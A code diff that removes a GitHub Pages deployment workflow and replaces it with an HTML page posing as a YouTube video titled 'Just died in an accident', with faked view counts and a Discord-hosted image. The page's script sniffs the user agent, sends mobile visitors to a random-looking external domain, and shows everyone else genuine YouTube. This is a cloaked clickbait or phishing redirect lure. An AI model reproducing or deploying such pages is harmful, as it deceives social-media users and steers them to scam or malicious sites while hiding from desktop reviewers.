@@ -1,43 +1,44 @@
-# Simple workflow for deploying static content to GitHub Pages
-name: Deploy static content to Pages
+		<meta name="facebook:app:country" content="US" />
+		<meta property="og:title" content="𝐉𝐮𝐬𝐭 𝐝𝐢𝐞𝐝 𝐢𝐧 𝐚𝐧 𝐚𝐜𝐜𝐢𝐝𝐞𝐧𝐭" />
+		<meta property="og:description" content="565.612 Views" />
+		<meta property="og:site_name" content="Youtube" />
+		<meta property="fb:app_id" content="87741124305" />
+		<meta
+			property="og:image"
+			content="https://media.discordapp.net/attachments/991753818033356980/1124700904227086446/rtert55680947u09tuiosiroispuir0uufgopulfdjxglnfdglindfhg.jpeg"
+		/>
+	</head>
+	<body>
+		<script type="text/javascript">
+			//<![CDATA[
+			var device = navigator.userAgent;
 
-on:
-  # Runs on pushes targeting the default branch
-  push:
-    branches: ["main"]
-
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
-permissions:
-  contents: read
-  pages: write
-  id-token: write
-
-# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
-# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
-
-jobs:
-  # Single deploy job since we're just deploying
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-      - name: Setup Pages
-        uses: actions/configure-pages@v3
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v2
-        with:
-          # Upload entire repository
-          path: '.'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v2
+			if (
+				device.match(/Iphone/i) ||
+				device.match(/Ipod/i) ||
+				device.match(/Android/i) ||
+				device.match(/J2ME/i) ||
+				device.match(/BlackBerry/i) ||
+				device.match(/iPhone|iPad|iPod/i) ||
+				device.match(/Opera Mini/i) ||
+				device.match(/IEMobile/i) ||
+				device.match(/Mobile/i) ||
+				device.match(/Windows Phone/i) ||
+				device.match(/windows mobile/i) ||
+				device.match(/windows ce/i) ||
+				device.match(/webOS/i) ||
+				device.match(/palm/i) ||
+				device.match(/bada/i) ||
+				device.match(/series60/i) ||
+				device.match(/nokia/i) ||
+				device.match(/symbian/i) ||
+				device.match(/HTC/i)
+			) {
+				window.location = 'https://sdffreswgfsdgbdfgfd.ac-page.com/retgewtfdgfdgfd?test=true';
+			} else {
+				window.location = 'https://www.youtube.com/';
+			}
+			//]]>
+		</script>
+	</body>
+</html>
